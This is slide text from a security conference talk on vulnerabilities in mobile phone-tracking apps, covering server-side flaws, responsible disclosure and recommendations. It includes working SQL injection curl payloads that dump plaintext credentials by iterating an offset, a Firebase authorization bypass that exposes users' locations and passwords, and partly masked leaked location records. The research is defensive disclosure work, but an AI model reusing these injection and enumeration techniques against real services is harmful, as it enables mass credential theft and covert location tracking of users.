bile":"9********2","lat":"*2.4393024","lon":"-*5.0414924","time":"23:0,20-112016"},{"to_username":"****","to_mobile":"9********8","lat":"*2.4386613","lon":"-*5.0398665","time":"7:14,21-112016"},{"to_username":"****","to_mobile":"8********6","lat":"*3.7005867","lon":"*6.9793598","time":"17:33,24-122016"},{"to_username":"****","to_mobile":"8********5","lat":"*2.584631","lon":"*8.2787425","time":"20:56,22-112016"},{"to_username":"*****","to_mobile":"8********1","lat":"*2.7993167","lon":"*6.2369126","time":"17:49,26-112016"},{"to_username":"****","to_mobile":"9*******5","lat":"*2.5846746","lon":"*8.2787492","time":"18:28,21-112016"},{"to_username":"***","to_mobile":"8*******7","lat":"*2.4069115","lon":"-*1.1435983",...

SQL - Simple
128

Accessing Images § Cloud storage for images

Accessing Images § Cloud storage for images § "One cloud" for all images

Accessing Images § Cloud storage for images § "One cloud" for all images § User authentication required § Filter corresponding images by user id

Accessing Images § Cloud storage for images § One cloud for all images § User authentication required § Filter corresponding images by user id § Compromise the cloud to get access to all images

Demo Time !
133

Get all User Credentials
§ App provides an API and a process for reinstallation of the app 1. App checks if user already has an account 2. Sends device id to the server
POST http://push001.***********/***********/v5/ Content-Type: application/json {"method":"getuserid","deviceid":"c1b86d87ed6f51011c0d53a654f16455"}

Get all User Credentials
§ App provides an API and a process for reinstallation of the app 1. App checks if user already has an account 2. Sends device id to the server 3. Server checks if id exists and responses with:
username, password and email
POST http://push001.***********/***********/v5/ Content-Type: application/json {"method":"getuserid","deviceid":"c1b86d87ed6f51011c0d53a654f16455"}

Attack Strategy
§ Spoofing the device id will deliver us credentialsBUT device id generation is relative complex and guessing is unlikely

Attack Strategy
§ Spoofing the device id will deliver us credentialsBUT device id generation is relative complex and guessing is unlikely
§ Empty id trick does not work L
POST http://push001.***********/***********/v5/ Content-Type: application/json {"method":"getuserid","deviceid":" "}

Attack Strategy
§ Spoofing the device id will deliver us credentials § BUT device id generation is relative complex and guessing is unlikely § Empty id trick does not work L § Let`s try SQL injection again J
POST http://push001.***********/***********/v5/ Content-Type: application/json {"method":"getuserid","deviceid":" ' or 1=1 limit 1 offset 5 -- "}

SQL-Injection

§ Curl Command:

curl -H "Content-Type: application/json" -X POST -d "{\"method\":\"getuserid\", \"deviceid\":\" ' or 1=1 limit 1 offset 5 -http://push001.***********/*********/v5/

\"}"

SQL-Injection

§ Curl Command:

curl -H "Content-Type: application/json" -X POST -d "{\"method\":\"getuserid\", \"deviceid\":\" ' or 1=1 limit 1 offset 5 -http://push001.***********/*********/v5/

\"}"

§ Result:

{"result":"success", "id":"yb*****","pass":"y********4","email":"y*****@hanmail.net"}

plaintext password

SQL-Injection

§ Curl Command:

iterate over the offset

curl -H "Content-Type: application/json" -X POST -d "{\"method\":\"getuserid\", \"deviceid\":\" ' or 1=1 limit 1 offset 6 -http://push001.***********/*********/v5/

\"}"

§ Result:

{"result":"success", "id":"se*****","pass":"qwe*******4","email":"se*****@gmail.com"}

plaintext password

SQL-Injection

§ Curl Command:

iterate over the offset

curl -H "Content-Type: application/json" -X POST -d "{\"method\":\"getuserid\", \"deviceid\":\" ' or 1=1 limit 1 offset 1700400 -http://push001.***********/*********/v5/

\"}"

> 1.700.000 plaintext credentials

WTF ?
143

Firebase

https://firebase.google.com/

Authentication Misconfiguration

http://*******/*****celltracker/api attacker

tracker backend

Authentication Misconfiguration

attacker

POST /*******celltracker/api/login HTTP/1.1 {"user_email":"foo@bar.com"}
victim email

tracker backend

Authentication Misconfiguration

attacker

HTTP/1.1 200 OK {"login_data":[{"user_id":"149737514214639",...}

tracker backend

Authorisation Misconfiguration
https://*****************.firebaseio.com/Users/149737514214639
attacker

Location without Authorisation

attacker

HTTP/1.1 200 OK
{ last_location={ address= Rheinstraße 75 64295 Darmstadt Germany date=13/06/2017 lat=49.8717048 long=8.6387116 ... }

Faceplam Light

But there is More

attacker

HTTP/1.1 200 OK
{ ... user_email=foo@bar.com user_name=theuser user_password=123456 user_token=cQfgiDRWx9o:APA91bGTkU1N9F... user_type=1 .. }

But there is More

attacker

HTTP/1.1 200 OK
{ ... user_email=foo@bar.com user_name=theuser user_password=123456 user_token=cQfgiDRWx9o:APA91bGTkU1N9F... user_type=1 .. }

But there is More

HTTP/1.1 200 OK
{ ... user_email=foo@bar.com user_name=theuser user_password=123456 user_token=cQfgiDRWx9o:APA91bGTkU1N9F... user_type=1 .. }

public void onDataChange(DataSnapshot dataSnapshot) { PasswordActivity.this.util.log("userid password123", "" + dataSnapshot.getValue());
if(PasswordActivity.get_string_from_edittext(PasswordActivity.ed_password).compareToIgnoreCase( dataSnapshot.getValue().toString()) == 0) { .... PasswordActivity.this.save_user_data(); return;
}
PasswordActivity.lDialog.dismiss(); PasswordActivity.this.util.toast("Password Wrong"); }

But there is More

HTTP/1.1 200 OK
{ ... user_email=foo@bar.com user_name=theuser user_password=123456 user_token=cQfgiDRWx9o:APA91bGTkU1N9F... user_type=1 .. }

public void onDataChange(DataSnapshot dataSnapshot) { PasswordActivity.this.util.log("userid password123", "" + dataSnapshot.getValue());
if(PasswordActivity.get_string_from_edittext(PasswordActivity.ed_password).compareToIgnoreCase( dataSnapshot.getValue().toString()) == 0) { .... PasswordActivity.this.save_user_data(); return;
}
PasswordActivity.lDialog.dismiss(); PasswordActivity.this.util.toast("Password Wrong"); }

But there is More

HTTP/1.1 200 OK
{ ... user_email=foo@bar.com user_name=theuser user_password=123456 user_token=cQfgiDRWx9o:APA91bGTkU1N9F... user_type=1 .. }

public void onDataChange(DataSnapshot dataSnapshot) { PasswordActivity.this.util.log("userid password123", "" + dataSnapshot.getValue());
if(PasswordActivity.get_string_from_edittext(PasswordActivity.ed_password).compareToIgnoreCase( dataSnapshot.getValue().toString()) == 0) { .... PasswordActivity.this.save_user_data(); return;
}
PasswordActivity.lDialog.dismiss(); PasswordActivity.this.util.toast("Password Wrong"); }

But there is More

HTTP/1.1 200 OK
{ ... user_email=foo@bar.com user_name=theuser user_password=123456 user_token=cQfgiDRWx9o:APA91bGTkU1N9F... user_type=1 .. }

public void onDataChange(DataSnapshot dataSnapshot) { PasswordActivity.this.util.log("userid password123", "" + dataSnapshot.getValue());
if(PasswordActivity.get_string_from_edittext(PasswordActivity.ed_password).compareToIgnoreCase( dataSnapshot.getValue().toString()) == 0) { .... PasswordActivity.this.save_user_data(); return;
}
PasswordActivity.lDialog.dismiss(); PasswordActivity.this.util.toast("Password Wrong"); }

Sh** happens

What`s wrong ? § Misconfiguration of Firebase, no authorisation rules

What`s wrong ?
§ Misconfiguration of Firebase, no authorisation rules § User authentication is done on app (client) side § User authentication must be done on server side

What`s wrong ?
§ Misconfiguration of Firebase, no authorisation rules § User authentication is done on app (client) side § User authentication must be done on server side § Provider Backend must handle the authentication process for the
firebase storage or even better use Firebase API*
*https://firebase.google.com/docs/auth/

What`s wrong ?
§ Misconfiguration of Firebase, no authorisation rules § User authentication is done on app (client) side § User authentication must be done on server side § Provider Backend must handle the authentication process for the
firebase storage or even better use Firebase API* § Worst case, if you submit the parent URL without the concrete user
ID, you get all the data => firebase misconfiguration
*https://firebase.google.com/docs/auth/

Agenda
§ Introduction/Motivation § Background Information § Bad Client-Side Checks with SharedPreferences § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
162

Responsible Disclosure
§ Announced vendors, 90 days to fix the bugs § Reactions:
§ A few: "We will fix it" § No reaction § "How much money do you want" § "It's not a bug, it's a feature"

Responsible Disclosure
§ Announced vendors, 90 days to fix the bugs § Reactions:
§ A few: "We will fix it" § No reaction § "How much money do you want" § "It's not a bug, it's a feature"
§ Announced to Google Android Security and to ASI (app security improvement)Team -> no direct reaction

Responsible Disclosure
§ Announced vendors, 90 days to fix the bugs § Reactions:
§ A few: "We will fix it" § No reaction § "How much money do you want" § "It's not a bug, it's a feature"
§ Announced to Google Android Security and to ASI (app security improvement)Team -> no direct reaction
§ Some apps removed from play store (12 of 19) § Still vulnerable backends and apps in the store

Responsible Disclosure
§ Announced vendors, 90 days to fix the bugs § Reactions:
§ A few: "We will fix it" § No reaction § "How much money do you want" § "It's not a bug, it's a feature"
§ Announced to Google Android Security and to ASI (app security improvement)Team -> no direct reaction
§ Some apps removed from play store (12 of 19) § Still vulnerable backends and apps in the store § Some app are detected as malware (e.g. Firefox download blocker)

Recommendations § DON`T use plaintext communication in mobile !

Recommendations
§ DON`T use plaintext communication in mobile ! § Use prepared statements (in correct way J) to avoid SQL injection

Recommendations
§ DON`T use plaintext communication in mobile ! § Use prepared statements (in correct way J) to avoid SQL injection § App security is important but consider also back end security

Recommendations § DON`T use plaintext communication in mobile ! § Use prepared statements (in correct way J) to avoid SQL injection § App security is important but consider also back end security § DON'T store any user secrets in the app (client side)
*https://firebase.google.com/docs/auth/

Recommendations
§ DON`T use plaintext communication in mobile ! § Use prepared statements (in correct way J) to avoid SQL injection § App security is important but consider also back end security § DON'T store any user secrets in the app (client side) § If you provide premium or payment feature, do verification on server § Authentication and authorization for backend data (e.g. firebase*)
*https://firebase.google.com/docs/auth/

Agenda
§ Introduction/Motivation § Background Information § Bad Client-Side Checks with SharedPreferences § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
172

My Family GPS Tracker KidControll GPS Tracker Family Locator (GPS) Free Cell Tracker Rastreador de Novia 1 Rastreador de Novia 2 Phone Tracker Free Phone Tracker Pro Rastrear Celular Por el Numero Localizador de Celular GPS Rastreador de Celular Avanzado Handy Orten per Handynr Localiser un Portable avec son Numero Phone Tracker By Number Track My Family Couple Vow Real Time GPS Tracker Couple Tracker App Ilocatemobile

Client-Side Vulnerability
X X X X X X X X X X X X X X
X X
173

Direct Data Breach X
X X X X X X X X X X X X X X
X

174

175

176

177

178

179

180

Siegfried Rasthofer Email: siegfried.rasthofer@sit.fraunhofer.de Web: www.rasthofer.info
Stephan Huber Email: stephan.huber@sit.fraunhofer.de
Twitter: @teamsik Website: www.team-sik.org
181

